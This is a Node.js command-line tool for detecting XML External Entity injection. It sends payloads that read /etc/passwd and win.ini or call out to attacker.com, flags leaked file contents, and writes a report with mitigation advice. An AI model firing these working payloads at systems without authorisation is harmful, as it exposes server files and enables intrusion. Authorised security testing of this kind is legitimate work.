#!/usr/bin/env node
/**
 * XXE (XML External Entity) Injection Tester
 * Tests for XXE injection vulnerabilities.
 */

const https = require('https');
const http = require('http');
const fs = require('fs');

class XXETester {
    constructor(url) {
        this.url = url;
        this.payloads = [
            `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
            `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>`,
            `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>`
        ];
        this.vulnerable = false;
    }

    makePostRequest(url, data, headers = {}) {
        return new Promise((resolve, reject) => {
            const protocol = url.startsWith('https') ? https : http;
            const urlObj = new URL(url);
            
            const options = {
                hostname: urlObj.hostname,
                port: urlObj.port || (protocol === https ? 443 : 80),
                path: urlObj.pathname + urlObj.search,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/xml',
                    'Content-Length': Buffer.byteLength(data),
                    ...headers
                },
                timeout: 10000
            };
            
            const req = protocol.request(options, (res) => {
                let responseData = '';
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                res.on('end', () => {
                    resolve({ statusCode: res.statusCode, text: responseData });
                });
            });
            
            req.on('error', (err) => {
                reject(err);
            });
            
            req.write(data);
            req.end();
        });
    }

    async testXXE() {
        console.log(`[*] Testing ${this.url} for XXE injection...`);
        
        for (const payload of this.payloads) {
            try {
                const response = await this.makePostRequest(this.url, payload);
                
                const indicators = ['root:', 'bin/bash', 'for 16-bit', '[fonts]'];
                if (indicators.some(ind => response.text.includes(ind))) {
                    console.log('[+] Potential XXE vulnerability detected!');
                    this.vulnerable = true;
                    return true;
                }
            } catch (err) {
                console.log(`[-] Error: ${err.message}`);
            }
        }
        
        return false;
    }

    generateReport() {
        let report = `# XXE Injection Test Report for ${this.url}\n\n`;
        
        if (this.vulnerable) {
            report += `⚠️ **VULNERABLE**: XXE injection vulnerability detected!\n\n`;
        } else {
            report += `✅ No XXE vulnerability detected.\n\n`;
        }
        
        report += `## Tested Payloads\n\n`;
        this.payloads.forEach((payload, i) => {
            report += `### Payload ${i + 1}\n\n`;
            report += `\`\`\`xml\n${payload}\n\`\`\`\n\n`;
        });
        
        report += `## Recommendations\n\n`;
        report += `1. Disable XML external entity processing\n`;
        report += `2. Use whitelist for allowed XML entities\n`;
        report += `3. Use simpler data formats (JSON) when possible\n`;
        report += `4. Keep XML parsers updated\n\n`;
        
        return report;
    }
}

async function main() {
    if (process.argv.length < 3) {
        console.log('Usage: node xxe_injection.js <url>');
        console.log('Example: node xxe_injection.js http://example.com/api/xml');
        process.exit(1);
    }
    
    const url = process.argv[2];
    const tester = new XXETester(url);
    await tester.testXXE();
    
    const report = tester.generateReport();
    
    const filename = 'xxe_test_report.md';
    fs.writeFileSync(filename, report, 'utf8');
    
    console.log(`[+] XXE testing complete`);
    console.log(`[+] Report saved to ${filename}`);
    console.log(`[!] WARNING: Only test applications you own or have permission to test!`);
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = XXETester;

